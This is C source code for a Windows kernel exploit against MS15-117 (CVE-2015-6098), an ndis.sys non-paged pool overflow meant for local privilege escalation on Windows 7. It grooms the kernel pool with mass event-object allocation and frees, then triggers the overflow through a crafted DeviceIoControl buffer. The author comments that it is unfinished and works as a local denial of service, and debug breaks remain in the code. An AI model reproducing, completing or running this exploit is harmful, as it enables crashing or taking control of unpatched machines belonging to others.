#pragma warning (disable : 6001)

#include "exploit.h"

HANDLE h_initial_nonpaged_allocations[0x22 * 0x4000], h_sequential_nonpaged_allocations[0x22 * 0x4000];

// This exploit is unfinished.
// In its current state, it can be used as a local denial of service.
// The reason as to why I did not finish this exploit is because the freed pool memory is not coalescing into a size of 0x880, which is the size of an Io object (in this situation).
// Because the freed pool memory does not coalesce (for one reason or another), I am unable to exploit this vulnerability (as of now).
int main(int argc, char** argv)
{
	INPUT_BUFFER input;
	HANDLE h_driver = CreateFileA(DEVICE, 0x80, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0;
	unsigned char unused = 0, output[2048];

	RtlSecureZeroMemory(&h_sequential_nonpaged_allocations, sizeof(h_sequential_nonpaged_allocations));
	RtlSecureZeroMemory(&h_initial_nonpaged_allocations, sizeof(h_initial_nonpaged_allocations));
	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	SetConsoleTitleA("MS15-117 - CVE-2015-6098");

	printf("[*] Microsoft Windows ndis.sys ndis!ndisNsiGetIfNameForIfIndex Kernel Non-paged Pool Overflow Local Privilege Escalation\n[*] Tested (un)successfully on Windows 7 SP1 Build 7601 32-bit\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the device driver. Handle Value: 0x%p", h_driver);

	for (int i = 0; i < 0x22 * 0x4000; i++)
	{
		h_initial_nonpaged_allocations[i] = CreateEventW(0, 0, 0, 0);
		if (!h_initial_nonpaged_allocations[i])
		{
			printf("\n[-] Failed to allocate an event object. Error: %d (0x%x)", GetLastError(), GetLastError());
			unused = getchar();
			return 1;
		}
	}
	printf("\n[+] Derandomized the non-paged pool.");

	for (int i = 0; i < 0x22 * 0x4000; i++)
	{
		h_sequential_nonpaged_allocations[i] = CreateEventW(0, 0, 0, 0);
		if (!h_sequential_nonpaged_allocations[i])
		{
			printf("\n[-] Failed to allocate an event object. Error: %d (0x%x)", GetLastError(), GetLastError());
			unused = getchar();
			return 1;
		}
	}
	printf("\n[+] Allocated sequential non-paged pool objects.");

	// TEST
	for (int i = 0; i < 100; i++)
	{
		printf("\nh: 0x%p", h_sequential_nonpaged_allocations[i]);
	}
	getchar();
	DebugBreak();
	getchar();
	// TEST

	for (int i = 0x22; i < 0x22 * 0x4000; i += 0x44)
	{
		for (int index_offset = 0; index_offset < 0x22; index_offset++)
		{
			if (!CloseHandle(h_sequential_nonpaged_allocations[i + index_offset]))
			{
				printf("\n[-] Failed to free an event object. Error: %d (0x%x)", GetLastError(), GetLastError());
				unused = getchar();
				return 1;
			}
		}
	}
	printf("\n[+] Created holes in the non-paged pool with the size of 0x880.");

	// TEST
	DWORD test_input[28];
	test_input[0] = 0x1;
	test_input[1] = 0x41424344;	// Controls TypeIndex overwrite..?
	test_input[2] = 0x42424242;
	test_input[3] = 0x43434343;
	test_input[4] = 0x5;
	test_input[5] = 0x44444444;
	test_input[6] = 0x3FFFFFFF;
	test_input[7] = 0xFFFFFFFF;
	test_input[8] = 0x97;
	test_input[9] = 0x45454545;
	test_input[10] = 0x0;
	test_input[11] = 0x46464646;
	test_input[12] = 0x47474747;
	test_input[13] = 0x5F;
	test_input[14] = 0x0;
	test_input[15] = 0x0;
	test_input[16] = 0x48484848;
	test_input[17] = 0x6;
	test_input[18] = 0xFFFFFFFF;
	test_input[19] = 0x8A49F9C8;
	test_input[20] = 0x0;
	test_input[21] = 0x0;
	test_input[22] = 0x1;
	test_input[23] = 0x49494949;
	test_input[24] = 0x4A4A4A4A;
	test_input[25] = 0x2A;
	test_input[26] = 0x9;
	test_input[27] = 0xE;
	DebugBreak();
	getchar();
	DeviceIoControl(h_driver, IOCTL_OVERFLOW, &test_input, sizeof(test_input), &output, sizeof(output), &bytes_returned, 0);
	DebugBreak();
	// TEST

	printf("\n[+] Exploitation complete.");
	unused = getchar();
	return 0;
}